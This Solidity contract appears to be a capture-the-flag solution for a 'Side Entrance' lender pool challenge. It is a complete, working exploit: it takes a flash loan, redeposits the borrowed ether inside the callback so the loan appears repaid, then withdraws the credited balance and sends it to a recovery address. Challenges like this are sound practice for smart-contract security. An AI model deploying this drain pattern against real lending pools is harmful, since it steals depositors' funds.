// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import "../side-entrance/SideEntranceLenderPool.sol";

contract AttackSideEntranceLenderPool {
    SideEntranceLenderPool public pool;
    address public recovery;
    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function attack() external payable {
        pool.flashLoan(1000e18);
        pool.withdraw();
        payable(recovery).transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
